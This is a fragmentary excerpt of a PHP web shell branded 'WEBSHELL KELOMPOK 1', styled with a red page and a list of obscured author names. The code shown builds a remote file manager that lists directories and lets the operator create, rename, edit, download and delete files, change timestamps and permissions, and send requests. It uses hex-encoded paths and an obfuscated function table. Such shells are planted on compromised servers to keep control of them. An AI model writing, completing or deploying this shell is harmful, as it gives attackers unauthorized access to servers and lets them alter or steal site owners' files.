...
<!DOCTYPE html>
	<html style="background: #6C2626!important; color:white;"dir="auto" lang="en-US">

		<head>
			<meta charset="UTF-8">
			<meta name="robots" content="NOINDEX, NOFOLLOW">

				<title>WEBSHELL KELOMPOK 1 Made modified by dhxmasfxrdxxnsyxh</title>

			<link rel="icon" href="https://i.postimg.cc/zGpVvwXS/ttt1.png" />
	...
	.header {
	  ...
	  text-align: center;
		...
		<body>
			<header class="header">
				<div>
  <h3>WEB SHELL KELOMPOK 1</h3> <img src="https://i.postimg.cc/zGpVvwXS/ttt1.png" alt="Kelompok 1" width="100" height="100">
				</div>
...
showTime();
				...
				<div style="color:#FFF998" class="q x w">
					&#8212; Dhxmas FXxxiansxah &#8212; Ahmxd SxXxawxn &#8212; BxgXs RxfkxXnsXah &#8212; FauXxn xXi GhxfXr &#8212; MxhaxxXd Xdrixn Mxulxxa &#8212;
				</div>
				...
				<div class="u">
					...
					echo '<table cellspacing="0" cellpadding="7" width="100%">
						...
						<tbody>
							<tr>
								<td>
									<a style="color:#FFF000" class="ajx" href="?d='.hex($d).'&n">+FILE</a>
									<a style="color:#FFF000" class="ajx" href="?d='.hex($d).'&l">+DIR</a>
								</td>
							</tr>
						';
							...
							if(($c != ".") && ($c != "..")){
								...
								$h .= '<tr class="r">
							<td>
								<i style="color:#C9F5FF" class="far fa-folder m"></i>
								<a style="color:#AAF0FF" class="ajx" href="?d='.hex($e).hex("/".$c).'">'.$c.'</a>
							</td>
							<td style="color:#AAF0FF" class="x">
								dir
							</td>
							<td class="x">
								<a style="color:#AAF0FF" class="ajx'.$o.'" href="?d='.hex($e).'&k='.hex($c).'">'.x("$d/$c").'</a>
							</td>
							<td class="x">
								<a style="color:#AAF0FF" class="ajx" href="?d='.hex($e).'&t='.hex($c).'">'.$GNJ[20]("Y-m-d H:i", $GNJ[21]("$d/$c")).'</a>
							</td>
							<td class="x">
								<a style="color:white"class="ajx" href="?d='.hex($e).'&r='.hex($c).'">R</a>
								<a style="color:#FF7E7E" href="?d='.hex($e).'&x='.hex($c).'">D</a>
							</td>
						</tr>
						...
						'
							:
								$j .= '<tr class="r">
							<td>
								<i  style="color:#FFF774" class="far fa-file m"></i>&thinsp;
								<a  style="color:#FFF774" class="ajx" href="?d='.hex($e).'&s='.hex($c).'">'.$c.'</a>
							</td>
							<td style="color:#FFF998" class="x">
								'.$s.'
							</td>
							<td class="x">
								<a style="color:#FFF998" class="ajx'.$o.'" href="?d='.hex($e).'&k='.hex($c).'">'.x("$d/$c").'</a>
							</td>
							<td class="x">
								<a style="color:#FFF998" class="ajx" href="?d='.hex($e).'&t='.hex($c).'">'.$GNJ[20]("Y-m-d H:i", $GNJ[21]("$d/$c")).'</a>
							</td>
							<td class="x">
								<a style="color:white" class="ajx" href="?d='.hex($e).'&r='.hex($c).'">R</a>
								<a style="color:white" class="ajx" href="?d='.hex($e).'&e='.hex($c).'">E</a>
								<a style="color:white" href="?d='.hex($e).'&g='.hex($c).'">G</a>
								'.$zi.'
								<a style="color:#FF7E7E" href="?d='.hex($e).'&x='.hex($c).'">D</a>
							</td>
						</tr>
						...
						<tfoot>
							<tr>
								<th class="et">
									<a style="color:#FFF000" class="ajx" href="?d='.hex($e).'&y">REQUEST</a>
									<a style="color:#FFF000" href="?d='.hex($e).'&q">EXIT</a>
								</th>
